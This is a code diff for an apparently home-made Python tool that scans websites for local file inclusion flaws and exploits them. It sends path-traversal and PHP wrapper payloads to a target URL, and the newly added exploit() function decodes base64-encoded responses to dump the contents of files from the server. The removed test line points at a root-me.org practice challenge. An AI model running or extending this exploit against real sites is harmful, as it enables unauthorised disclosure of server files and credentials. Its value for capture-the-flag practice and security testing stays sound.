@@ -1,11 +1,15 @@
 #!/usr/bin/env python3
 
-import os, sys
-import re
-import requests
-import threading
-from Crawler import Crawler
+import base64
 import getopt
+import os
+import re
+import sys
+import threading
+
+import requests
+
+from Crawler import Crawler
 
 payloads = {
     "../": "../",
@@ -56,19 +60,18 @@ def test(url):
     if injectable(url):
         for test in payloads:
             payload = craftPayload(strip(url), payloads[test])
-            if inject(payload):
+            if injectionTest(payload):
                 print("Payload:", payload)
     else:
         print("The url may not be injectable")
 
-def craftPayload(url, *args):
-    if len(args) == 1:
-        return url + args[0]
+def craftPayload(url, *argv):
+    if len(argv) == 1:
+        return url + argv[0]
     else:
-        return url + itype + resource 
+        return url + payloads[argv[0]] + argv[1] 
         
-#lfiscan.py --inject --resource=index.php 
-def inject(payload):
+def injectionTest(payload):
     if re.search('zip://', payload) or re.search('php://input', payload) or re.search('phar://', payload):
         pass
     else:
@@ -87,8 +90,36 @@ def inject(payload):
         elif r.status_code == 301 or r.status_code == 302:
             print("Website might be vulnerable: returned", r.status_code, "\n")
             return False
-            
+
+def exploit(payload):
+    if re.search('zip://', payload):
+        pass
+    elif re.search('php://input', payload):
+        pass
+    elif re.search('phar://', payload):
+        pass
+    else:
+        r = requests.get(payload)
+        print(payload)
+        if r.status_code == 200:
+            print("Code: 200 OK")
+            if re.search('base64-encode', payload):
+                for i in re.findall('[a-zA-Z0-9+/]+={,2}', r.text):
+                    try:
+                        print(base64.b64decode(i).decode())
+                    except:
+                        pass
+        
+        elif r.status_code == 404:
+            print("Code: 404 Page Not Found")
+                 
+def inject(url, *argv):
+    if len(argv) == 2 and argv[0] in payloads:
+        url = strip(url)
+        payload = craftPayload(url, argv[0], argv[1])
+        exploit(payload)
+
 
 if __name__ == '__main__': #NOTE: THIS IS ONLY FOR TESTING, WILL SOON USE GETOPT
-    test("http://challenge01.root-me.org/web-serveur/ch16/?files=coding")
+    pass
         
